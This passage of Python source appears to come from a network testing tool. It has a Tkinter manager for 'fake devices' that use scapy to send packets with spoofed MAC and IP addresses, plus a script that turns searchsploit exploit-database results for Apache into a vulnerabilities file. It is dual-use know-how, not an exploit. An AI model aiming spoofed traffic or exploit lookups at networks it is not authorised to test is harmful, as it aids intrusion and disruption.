        self.ip_address_var.set("192.168.1.100")
        self.protocol_combo.current(0)
        self.dest_ip_var.set("192.168.1.1")
        self.dest_port_var.set("80")

    def remove_fake_device(self):
        """
        Removes the selected fake device.
        """
        selected = self.devices_tree.selection()
        if not selected:
            messagebox.showwarning("No Selection", "Please select a device to remove.")
            return

        device_name = selected[0]
        device_info = self.fake_devices.get(device_name)

        if device_info and device_info['status'] == "Running":
            messagebox.showwarning("Device Running", "Stop the device before removing it.")
            return

        # Remove from Treeview and dictionary
        self.devices_tree.delete(device_name)
        del self.fake_devices[device_name]

    def start_emulation(self):
        """
        Starts packet emulation for the selected fake device.
        """
        selected = self.devices_tree.selection()
        if not selected:
            messagebox.showwarning("No Selection", "Please select a device to start emulation.")
            return

        device_name = selected[0]
        device_info = self.fake_devices.get(device_name)

        if device_info['status'] == "Running":
            messagebox.showwarning("Already Running", "Emulation is already running for this device.")
            return

        # Create a stop event
        stop_event = threading.Event()
        device_info['stop_event'] = stop_event

        # Start the emulation thread
        emulation_thread = threading.Thread(target=self.emulate_device, args=(device_name, stop_event), daemon=True)
        device_info['thread'] = emulation_thread
        emulation_thread.start()

        # Update status
        device_info['status'] = "Running"
        self.devices_tree.set(device_name, "Status", "Running")

        # Enable Stop button
        self.stop_emulation_button.config(state=tk.NORMAL)

    def stop_emulation(self):
        """
        Stops packet emulation for the selected fake device.
        """
        selected = self.devices_tree.selection()
        if not selected:
            messagebox.showwarning("No Selection", "Please select a device to stop emulation.")
            return

        device_name = selected[0]
        device_info = self.fake_devices.get(device_name)

        if device_info['status'] != "Running":
            messagebox.showwarning("Not Running", "Emulation is not running for this device.")
            return

        # Signal the thread to stop
        device_info['stop_event'].set()
        device_info['thread'].join()

        # Update status
        device_info['status'] = "Stopped"
        self.devices_tree.set(device_name, "Status", "Stopped")

        # Disable Stop button if no devices are running
        any_running = any(info['status'] == "Running" for info in self.fake_devices.values())
        if not any_running:
            self.stop_emulation_button.config(state=tk.DISABLED)

    def emulate_device(self, device_name, stop_event):
        """
        Sends crafted packets based on the device's configuration until stopped.
        """
        device_info = self.fake_devices.get(device_name)
        if not device_info:
            return

        mac = device_info['mac']
        ip = device_info['ip']
        protocol = device_info['protocol']
        dest_ip = device_info['dest_ip']
        dest_port = device_info['dest_port']

        while not stop_event.is_set():
            try:
                if protocol == "TCP":
                    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src=ip, dst=dest_ip) / TCP(dport=dest_port, flags="S")
                elif protocol == "UDP":
                    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src=ip, dst=dest_ip) / UDP(dport=dest_port)
                elif protocol == "ICMP":
                    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src=ip, dst=dest_ip) / ICMP()
                else:
                    continue  # Unsupported protocol

                send(pkt, verbose=False)
                time.sleep(1)  # Adjust the frequency as needed
            except Exception as e:
                messagebox.showerror("Emulation Error", f"Error in emulating device {device_name}:\n{e}")
                break

    # Additional methods can be implemented here if needed


# Example usage within a Tkinter application
def main():
    root = tk.Tk()
    root.title("Network Testing Tool")
    root.geometry("1200x800")

    # Create a Notebook (tabbed interface)
    notebook = ttk.Notebook(root)
    notebook.pack(fill=tk.BOTH, expand=True)

    # Add LivePacketMonitor tab
    # Assuming LivePacketMonitor is implemented as per your previous code
    from tkinter import ttk  # Re-import in case it's needed
    class LivePacketMonitor(BaseFrame):
        """
        Placeholder for LivePacketMonitor implementation.
        Replace this with your actual implementation.
        """
        def __init__(self, parent):
            super().__init__(parent)
            label = ttk.Label(self, text="Live Packet Monitor - To Be Implemented")
            label.pack(padx=10, pady=10)

    live_packet_monitor = LivePacketMonitor(notebook)
    notebook.add(live_packet_monitor, text="Live Packet Monitor")

    # Add FakeDeviceManager tab
    fake_device_manager = FakeDeviceManager(notebook)
    notebook.add(fake_device_manager, text="Fake Device Manager")

    root.mainloop()


if __name__ == "__main__":
    main()


# ui/frames/__init__.py


# vulnerabilities/download_searchsploit_data.py
import subprocess
import json
import os


def searchsploit_to_json(query: str) -> list:
    try:
        # Run Searchsploit with --json flag
        result = subprocess.run(
            ["searchsploit", query, "--json"],
            capture_output=True,
            text=True,
            check=True
        )

        # Load the JSON output
        exploits = json.loads(result.stdout)
        return exploits.get("RESULTS_EXPLOIT", [])
    except subprocess.CalledProcessError as e:
        print(f"Error running searchsploit: {e}")
        return []
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON output: {e}")
        return []


def convert_to_vulnerabilities_format(exploit_list: list) -> list:
    """
    Convert Searchsploit JSON output to vulnerabilities.json format.
    :param exploit_list:
    :return List of vulnerabilities in the desired format:
    """
    vulnerabilities = []

    for exploit in exploit_list:
        vulnerability = {
            "id": exploit.get("ID", ""),
            "name": exploit.get("Title", ""),
            "description": exploit.get("Description", "No description available."),
            "severity": "unknown",  # You may need to assign severity based on description
            "recommendation": "Refer to ExploitDB and apply appropriate patches.",
            "affected_protocols": [exploit.get("Platform", "unknown").lower()],
            "references": [
                f"https://www.exploit-db.com/exploits/{exploit.get('EDB-ID')}"
            ]
        }
        vulnerabilities.append(vulnerability)

    return vulnerabilities


# Specify the vulnerability query
query = "apache"

# Run Searchsploit to get results
exploits = searchsploit_to_json(query)

# Convert to desired vulnerabilities.json format
vulnerabilities = convert_to_vulnerabilities_format(exploits)

# Save to vulnerabilities.json file
vulnerabilities_path = "vulnerabilities.json"
with open(vulnerabilities_path, 'w') as f:
    json.dump({"vulnerabilities": vulnerabilities}, f, indent=4)

print(f"Saved {len(vulnerabilities)} vulnerabilities to {vulnerabilities_path}")


# vulnerabilities/__init__.py


